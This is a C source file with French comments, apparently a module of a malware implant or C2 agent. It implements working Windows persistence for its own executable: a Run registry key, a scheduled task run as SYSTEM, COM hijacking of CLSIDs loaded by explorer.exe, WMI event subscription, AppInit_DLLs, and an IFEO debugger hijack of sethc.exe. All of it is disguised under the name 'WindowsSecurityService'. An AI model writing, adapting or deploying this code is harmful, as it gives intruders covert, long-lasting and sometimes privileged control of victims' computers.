/*
 * persist.c - Implémentation des mécanismes de persistence
 *
 * Méthodes supportées:
 * - Registry Run key (HKCU)
 * - Scheduled Task (schtasks)
 * - COM Hijacking (CLSID InprocServer32)
 * - WMI Event Subscription
 */

#include "persist.h"
#include "../../utils/memory.h"
#include "../../utils/strings.h"
#include <objbase.h>
#include <wbemidl.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "wbemuuid.lib")

/* Nom utilisé pour la persistence */
#define PERSIST_NAME "WindowsSecurityService"

/* CLSIDs vulnérables pour COM Hijacking */
/* Ces CLSIDs sont souvent chargés par des processus système */
static const char* COM_HIJACK_CLSIDS[] = {
    /* CLSID_TaskBand - chargé par explorer.exe */
    "{56FDF344-FD6D-11D0-958A-006097C9A090}",
    /* MruPidlList */  
    "{42aedc87-2188-41fd-b9a3-0c966feabec1}",
    /* CLSID fréquemment utilisé par Office */
    "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e2}",
    NULL
};

/*
 * Récupère le chemin de l'exécutable courant.
 */
static bool get_current_exe_path(char *buffer, size_t buffer_size) {
  DWORD len = GetModuleFileNameA(NULL, buffer, (DWORD)buffer_size);
  return len > 0 && len < buffer_size;
}

/*
 * Persistence via la clé Run du registre.
 */
static int persist_registry_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }

  HKEY hkey;
  LONG result = RegOpenKeyExA(
      HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
      KEY_SET_VALUE, &hkey);

  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }

  result = RegSetValueExA(hkey, PERSIST_NAME, 0, REG_SZ, (BYTE *)exe_path,
                          (DWORD)strlen(exe_path) + 1);

  RegCloseKey(hkey);

  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime la persistence registry.
 */
static int persist_registry_remove(void) {
  HKEY hkey;
  LONG result = RegOpenKeyExA(
      HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
      KEY_SET_VALUE, &hkey);

  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }

  result = RegDeleteValueA(hkey, PERSIST_NAME);
  RegCloseKey(hkey);

  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Persistence via tâche planifiée.
 */
static int persist_schtask_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }

  /* Construit la commande schtasks */
  char cmd[1024];
  snprintf(
      cmd, sizeof(cmd),
      "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru SYSTEM /f 2>nul",
      PERSIST_NAME, exe_path);

  /* Essaie d'abord en SYSTEM (nécessite admin) */
  int result = system(cmd);

  if (result != 0) {
    /* Fallback en user mode */
    snprintf(cmd, sizeof(cmd),
             "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /f 2>nul",
             PERSIST_NAME, exe_path);
    result = system(cmd);
  }

  return result == 0 ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime la tâche planifiée.
 */
static int persist_schtask_remove(void) {
  char cmd[512];
  snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul",
           PERSIST_NAME);

  int result = system(cmd);
  return result == 0 ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * COM Hijacking - détourne un CLSID pour charger notre DLL
 * Nécessite que l'agent soit compilé en DLL
 */
static int persist_com_hijack_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }
  
  /* Utilise le premier CLSID de la liste */
  const char* clsid = COM_HIJACK_CLSIDS[0];
  
  char key_path[256];
  snprintf(key_path, sizeof(key_path), 
           "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
  
  HKEY hkey;
  LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, key_path, 0, NULL,
                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                NULL, &hkey, NULL);
  
  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }
  
  /* Définit le chemin de la DLL (valeur par défaut) */
  result = RegSetValueExA(hkey, NULL, 0, REG_SZ, 
                          (BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);
  
  if (result == ERROR_SUCCESS) {
    /* ThreadingModel requis */
    const char* threading = "Both";
    RegSetValueExA(hkey, "ThreadingModel", 0, REG_SZ,
                   (BYTE*)threading, (DWORD)strlen(threading) + 1);
  }
  
  RegCloseKey(hkey);
  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime le COM Hijacking
 */
static int persist_com_hijack_remove(void) {
  const char* clsid = COM_HIJACK_CLSIDS[0];
  
  char key_path[256];
  snprintf(key_path, sizeof(key_path),
           "Software\\Classes\\CLSID\\%s", clsid);
  
  /* Supprime la clé et ses sous-clés */
  LONG result = RegDeleteTreeA(HKEY_CURRENT_USER, key_path);
  
  return (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND) 
         ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * WMI Event Subscription - persistence via événements WMI
 * Se déclenche à chaque démarrage du système
 */
static int persist_wmi_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }
  
  /* Échappe les backslashes pour WQL */
  char escaped_path[MAX_PATH_LEN * 2];
  int j = 0;
  for (int i = 0; exe_path[i] && j < sizeof(escaped_path) - 2; i++) {
    if (exe_path[i] == '\\') {
      escaped_path[j++] = '\\';
    }
    escaped_path[j++] = exe_path[i];
  }
  escaped_path[j] = '\0';
  
  /* Utilise WMIC pour créer l'event subscription */
  /* Plus simple que l'API COM WMI */
  
  char cmd[2048];
  
  /* 1. Crée l'EventFilter */
  snprintf(cmd, sizeof(cmd),
    "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE "
    "Name=\"%s\", EventNamespace=\"root\\cimv2\", "
    "QueryLanguage=\"WQL\", "
    "Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
    "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
    "AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\" "
    ">nul 2>&1",
    PERSIST_NAME);
  
  system(cmd);
  
  /* 2. Crée le CommandLineEventConsumer */
  snprintf(cmd, sizeof(cmd),
    "wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE "
    "Name=\"%s\", CommandLineTemplate=\"%s\" "
    ">nul 2>&1",
    PERSIST_NAME, exe_path);
  
  system(cmd);
  
  /* 3. Lie le filter au consumer */
  snprintf(cmd, sizeof(cmd),
    "wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE "
    "Filter=\"__EventFilter.Name='%s'\", "
    "Consumer=\"CommandLineEventConsumer.Name='%s'\" "
    ">nul 2>&1",
    PERSIST_NAME, PERSIST_NAME);
  
  int result = system(cmd);
  
  return result == 0 ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime la persistence WMI
 */
static int persist_wmi_remove(void) {
  char cmd[1024];
  
  /* Supprime le binding */
  snprintf(cmd, sizeof(cmd),
    "wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding WHERE "
    "\"Filter='__EventFilter.Name=\\\"%s\\\"'\" DELETE >nul 2>&1",
    PERSIST_NAME);
  system(cmd);
  
  /* Supprime le consumer */
  snprintf(cmd, sizeof(cmd),
    "wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer WHERE "
    "\"Name='%s'\" DELETE >nul 2>&1",
    PERSIST_NAME);
  system(cmd);
  
  /* Supprime le filter */
  snprintf(cmd, sizeof(cmd),
    "wmic /namespace:\\\\root\\subscription PATH __EventFilter WHERE "
    "\"Name='%s'\" DELETE >nul 2>&1",
    PERSIST_NAME);
  system(cmd);
  
  return STATUS_SUCCESS;
}

/*
 * AppInit_DLLs - charge notre DLL dans tous les processus GUI
 * Nécessite admin et que l'agent soit une DLL
 */
static int persist_appinit_add(void) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }
  
  HKEY hkey;
  LONG result = RegOpenKeyExA(
    HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
    0, KEY_SET_VALUE, &hkey);
  
  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }
  
  /* Active AppInit_DLLs */
  DWORD loadAppInit = 1;
  RegSetValueExA(hkey, "LoadAppInit_DLLs", 0, REG_DWORD,
                 (BYTE*)&loadAppInit, sizeof(loadAppInit));
  
  /* Définit le chemin de la DLL */
  result = RegSetValueExA(hkey, "AppInit_DLLs", 0, REG_SZ,
                          (BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);
  
  RegCloseKey(hkey);
  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime AppInit_DLLs
 */
static int persist_appinit_remove(void) {
  HKEY hkey;
  LONG result = RegOpenKeyExA(
    HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
    0, KEY_SET_VALUE, &hkey);
  
  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }
  
  /* Désactive et vide */
  DWORD loadAppInit = 0;
  RegSetValueExA(hkey, "LoadAppInit_DLLs", 0, REG_DWORD,
                 (BYTE*)&loadAppInit, sizeof(loadAppInit));
  
  const char* empty = "";
  RegSetValueExA(hkey, "AppInit_DLLs", 0, REG_SZ,
                 (BYTE*)empty, 1);
  
  RegCloseKey(hkey);
  return STATUS_SUCCESS;
}

/*
 * Image File Execution Options - débugger hijacking
 * Se déclenche quand le programme cible est lancé
 */
static int persist_ifeo_add(const char* target_exe) {
  char exe_path[MAX_PATH_LEN];
  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
    return STATUS_FAILURE;
  }
  
  const char* target = target_exe ? target_exe : "sethc.exe";
  
  char key_path[512];
  snprintf(key_path, sizeof(key_path),
           "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
           target);
  
  HKEY hkey;
  LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, key_path, 0, NULL,
                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                NULL, &hkey, NULL);
  
  if (result != ERROR_SUCCESS) {
    return STATUS_FAILURE;
  }
  
  result = RegSetValueExA(hkey, "Debugger", 0, REG_SZ,
                          (BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);
  
  RegCloseKey(hkey);
  return result == ERROR_SUCCESS ? STATUS_SUCCESS : STATUS_FAILURE;
}

/*
 * Supprime IFEO
 */
static int persist_ifeo_remove(const char* target_exe) {
  const char* target = target_exe ? target_exe : "sethc.exe";
  
  char key_path[512];
  snprintf(key_path, sizeof(key_path),
           "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
           target);
  
  LONG result = RegDeleteTreeA(HKEY_LOCAL_MACHINE, key_path);
  
  return (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND)
         ? STATUS_SUCCESS : STATUS_FAILURE;
}

int handler_persist_add(const char *type) {
  if (!type) {
    /* Par défaut: registry */
    return persist_registry_add();
  }

  if (str_icmp(type, "registry") == 0 || str_icmp(type, "reg") == 0) {
    return persist_registry_add();
  } else if (str_icmp(type, "schtask") == 0 || str_icmp(type, "task") == 0) {
    return persist_schtask_add();
  } else if (str_icmp(type, "com") == 0 || str_icmp(type, "comhijack") == 0) {
    return persist_com_hijack_add();
  } else if (str_icmp(type, "wmi") == 0) {
    return persist_wmi_add();
  } else if (str_icmp(type, "appinit") == 0) {
    return persist_appinit_add();
  } else if (str_icmp(type, "ifeo") == 0) {
    return persist_ifeo_add(NULL);
  } else if (str_icmp(type, "all") == 0) {
    /* Toutes les méthodes non-admin */
    int r1 = persist_registry_add();
    int r2 = persist_schtask_add();
    int r3 = persist_com_hijack_add();
    return (r1 == STATUS_SUCCESS || r2 == STATUS_SUCCESS || r3 == STATUS_SUCCESS) 
           ? STATUS_SUCCESS : STATUS_FAILURE;
  } else if (str_icmp(type, "admin") == 0) {
    /* Méthodes nécessitant admin */
    int r1 = persist_wmi_add();
    int r2 = persist_appinit_add();
    int r3 = persist_ifeo_add(NULL);
    return (r1 == STATUS_SUCCESS || r2 == STATUS_SUCCESS || r3 == STATUS_SUCCESS)
           ? STATUS_SUCCESS : STATUS_FAILURE;
  }

  return STATUS_FAILURE;
}

int handler_persist_remove(const char *type) {
  if (!type || str_icmp(type, "all") == 0) {
    persist_registry_remove();
    persist_schtask_remove();
    persist_com_hijack_remove();
    persist_wmi_remove();
    persist_appinit_remove();
    persist_ifeo_remove(NULL);
    return STATUS_SUCCESS;
  }

  if (str_icmp(type, "registry") == 0 || str_icmp(type, "reg") == 0) {
    return persist_registry_remove();
  } else if (str_icmp(type, "schtask") == 0 || str_icmp(type, "task") == 0) {
    return persist_schtask_remove();
  } else if (str_icmp(type, "com") == 0 || str_icmp(type, "comhijack") == 0) {
    return persist_com_hijack_remove();
  } else if (str_icmp(type, "wmi") == 0) {
    return persist_wmi_remove();
  } else if (str_icmp(type, "appinit") == 0) {
    return persist_appinit_remove();
  } else if (str_icmp(type, "ifeo") == 0) {
    return persist_ifeo_remove(NULL);
  }

  return STATUS_FAILURE;
}

int handler_persist_list(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  char *buffer = (char *)malloc(2048);
  if (!buffer) {
    return STATUS_NO_MEMORY;
  }

  bool has_registry = false;
  bool has_com = false;
  bool has_appinit = false;
  bool has_ifeo = false;

  /* Check registry Run key */
  HKEY hkey;
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_READ, &hkey) == ERROR_SUCCESS) {
    char value[MAX_PATH_LEN];
    DWORD value_size = sizeof(value);
    DWORD type;
    if (RegQueryValueExA(hkey, PERSIST_NAME, NULL, &type, (BYTE *)value,
                         &value_size) == ERROR_SUCCESS) {
      has_registry = true;
    }
    RegCloseKey(hkey);
  }

  /* Check COM Hijacking */
  char com_key[256];
  snprintf(com_key, sizeof(com_key), 
           "Software\\Classes\\CLSID\\%s\\InprocServer32", COM_HIJACK_CLSIDS[0]);
  if (RegOpenKeyExA(HKEY_CURRENT_USER, com_key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
    has_com = true;
    RegCloseKey(hkey);
  }

  /* Check AppInit_DLLs */
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                    0, KEY_READ, &hkey) == ERROR_SUCCESS) {
    DWORD loadAppInit = 0;
    DWORD size = sizeof(loadAppInit);
    if (RegQueryValueExA(hkey, "LoadAppInit_DLLs", NULL, NULL,
                         (BYTE*)&loadAppInit, &size) == ERROR_SUCCESS) {
      if (loadAppInit == 1) {
        char appinit_dll[MAX_PATH_LEN];
        DWORD dll_size = sizeof(appinit_dll);
        if (RegQueryValueExA(hkey, "AppInit_DLLs", NULL, NULL,
                             (BYTE*)appinit_dll, &dll_size) == ERROR_SUCCESS) {
          if (strlen(appinit_dll) > 0) {
            has_appinit = true;
          }
        }
      }
    }
    RegCloseKey(hkey);
  }

  /* Check IFEO */
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
                    0, KEY_READ, &hkey) == ERROR_SUCCESS) {
    char debugger[MAX_PATH_LEN];
    DWORD dbg_size = sizeof(debugger);
    if (RegQueryValueExA(hkey, "Debugger", NULL, NULL,
                         (BYTE*)debugger, &dbg_size) == ERROR_SUCCESS) {
      has_ifeo = true;
    }
    RegCloseKey(hkey);
  }

  snprintf(buffer, 2048,
           "{\n"
           "  \"persistence_methods\": {\n"
           "    \"registry_run\": %s,\n"
           "    \"scheduled_task\": \"check_required\",\n"
           "    \"com_hijacking\": %s,\n"
           "    \"wmi_subscription\": \"check_required\",\n"
           "    \"appinit_dlls\": %s,\n"
           "    \"ifeo_debugger\": %s\n"
           "  },\n"
           "  \"available_methods\": [\"registry\", \"schtask\", \"com\", \"wmi\", \"appinit\", \"ifeo\"]\n"
           "}",
           has_registry ? "true" : "false",
           has_com ? "true" : "false",
           has_appinit ? "true" : "false",
           has_ifeo ? "true" : "false");

  *output = buffer;
  *len = strlen(buffer);

  return STATUS_SUCCESS;
}
